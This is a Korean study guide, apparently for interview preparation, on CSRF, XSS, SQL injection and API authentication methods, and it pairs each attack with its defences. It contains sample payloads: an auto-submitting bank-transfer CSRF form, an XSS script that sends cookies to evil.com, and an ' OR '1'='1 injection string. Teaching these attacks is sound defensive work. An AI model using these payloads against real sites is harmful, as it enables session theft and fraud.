# CSRF, XSS & 보안 방식 비교

---

## CSRF (Cross-Site Request Forgery)

### 공격 원리

```
사용자가 은행에 로그인 (세션 쿠키 저장)

악성 사이트 방문 → 숨겨진 폼이 자동 실행:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000000" />
</form>
<script>document.forms[0].submit();</script>

브라우저가 쿠키를 자동 포함 → 은행은 정상 요청으로 처리!

핵심: 브라우저가 쿠키를 '자동으로' 포함하기 때문에 발생
     → 쿠키 기반 인증의 근본적 취약점
```

### CSRF 방어 방법

```
1. CSRF Token (Synchronizer Token Pattern) ⭐
   서버: 폼에 랜덤 토큰 포함
   <input type="hidden" name="csrf_token" value="랜덤값" />
   → 악성 사이트는 이 토큰값을 알 수 없음!

2. SameSite 쿠키 속성
   Set-Cookie: session=abc; SameSite=Strict
   Strict: 다른 사이트에서 온 요청에 쿠키 전송 안 함
   Lax: GET은 허용, POST는 차단 (기본값 ⭐)
   None: 전체 허용 (Secure 필수, 크로스사이트 임베드 시)

3. JWT + Authorization 헤더 ⭐
   Authorization: Bearer eyJhb...
   → 브라우저가 자동 포함하지 않음!
   → CSRF 공격 원천 차단!

4. Referer/Origin 검증
   서버에서 요청의 Origin 헤더가 허용 목록에 있는지 확인
```

---

## XSS (Cross-Site Scripting)

### 공격 유형

```
1. Stored XSS (저장형) — 가장 위험:
   공격 스크립트가 DB에 저장 → 다른 사용자가 보면 실행
   
   게시글: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
   → 다른 사용자가 이 글을 보면 쿠키 탈취!
   → 공격 범위: 해당 페이지를 방문하는 모든 사용자

2. Reflected XSS (반사형):
   URL 파라미터에 스크립트 삽입
   
   https://shop.com/search?q=<script>alert('hack')</script>
   → 서버가 q 값을 그대로 HTML에 포함하면 실행!
   → 공격자가 이 URL을 피해자에게 전달

3. DOM-based XSS:
   클라이언트 JS가 사용자 입력을 DOM에 직접 삽입
   
   document.getElementById('output').innerHTML = userInput;
   → userInput에 <img onerror="악성코드"> 가 있으면 실행!
```

### XSS 방어 (깊이 있는 방어)

```
1. 출력 이스케이핑 (가장 중요!) ⭐
   < → &lt;  > → &gt;  & → &amp;  " → &quot;  ' → &#x27;
   → 스크립트 태그가 일반 텍스트로 표시
   
   프레임워크별 자동 이스케이핑:
     React: JSX가 자동 이스케이핑 (dangerouslySetInnerHTML 제외)
     Django: 템플릿이 자동 이스케이핑 ({{ var }} 안전, {{ var|safe }} 위험)
     Jinja2: 기본 비활성 → autoescape=True 설정 필요

2. CSP (Content Security Policy) ⭐
   Content-Security-Policy: 
     default-src 'self';           → 같은 Origin만
     script-src 'self' 'nonce-abc'; → 인라인 스크립트 차단
     style-src 'self' 'unsafe-inline';
     img-src 'self' data: https:;
   → 외부/인라인 스크립트 실행 원천 차단

3. httpOnly 쿠키
   Set-Cookie: session=abc; httpOnly; Secure; SameSite=Lax
   → JS에서 document.cookie 접근 불가 → 쿠키 탈취 방지

4. 입력 검증 (Sanitization)
   허용된 태그만 화이트리스트 (예: <b>, <i> 허용)
   나머지 HTML 태그는 제거
   → DOMPurify (프론트), bleach (Python) 등의 라이브러리
```

---

## SQL Injection

```
XSS와 함께 가장 흔한 웹 공격

공격:
  입력: ' OR '1'='1
  쿼리: SELECT * FROM users WHERE name='' OR '1'='1'
  → 항상 참 → 모든 사용자 정보 유출!

방어: Parameterized Query (Prepared Statement) ⭐
  ❌ f"SELECT * FROM users WHERE name='{input}'"  → SQL Injection!
  ✅ cursor.execute("SELECT * FROM users WHERE name=%s", (input,))
  → 입력값이 SQL 코드가 아닌 "데이터"로 처리됨

ORM 사용:
  ✅ User.objects.filter(name=input)  → 자동으로 Parameterized
```

---

## API 보안 방식 비교

| 방식 | 인증 주체 | 보안 수준 | 복잡도 | 사용 시나리오 |
|------|----------|---------|--------|-------------|
| **API 키** | 서비스 | 낮음 | 간단 | 공개 API, 과금 추적 |
| **JWT** | 사용자/서비스 | 보통 | 보통 | **API 인증** ⭐ |
| **OAuth 2.0** | 사용자 + 제3자 | 높음 | 복잡 | **SSO, 소셜 로그인** ⭐ |
| **mTLS** | 서비스 | 매우 높음 | 복잡 | 서비스 메시, 금융 |

### 각 방식의 특성

```
API 키:
  X-API-Key: abc123
  → 쉬움, 하지만 노출되면 무효화할 때까지 악용 가능
  → 사용자 구분 불가 (서비스 레벨만)
  → 예: Google Maps API, OpenAI API

JWT:
  Authorization: Bearer eyJhb...
  → 무상태, 사용자 정보 포함, 즉시 무효화 어려움
  → 자체 인증 또는 OAuth와 함께 사용

OAuth 2.0:
  여러 Grant Type으로 상황에 맞는 인증 제공
  → 가장 유연하지만 복잡

mTLS (Mutual TLS):
  클라이언트도 인증서 제출 (양방향 TLS)
  → 가장 강력하지만 인증서 관리 복잡
  → 서비스 간 통신, 금융 API
```

---

## 면접 핵심 포인트

```
Q: CSRF와 XSS의 차이?
A: CSRF: 사용자의 "인증 상태를 악용" (쿠키 자동 포함)
   XSS: "악성 스크립트를 실행" (쿠키 탈취, DOM 변조)
   CSRF는 서버 행동을 유도, XSS는 클라이언트를 공격

Q: JWT가 CSRF를 방지하는 이유?
A: JWT는 Authorization 헤더로 전달 → 브라우저 자동 포함 X
   CSRF는 쿠키 자동 포함을 악용하므로 JWT에는 무효.

Q: SQL Injection 방어법?
A: Parameterized Query (Prepared Statement) 사용.
   입력값이 SQL 코드가 아닌 데이터로 처리.
   ORM 사용 시 자동으로 Parameterized.
```
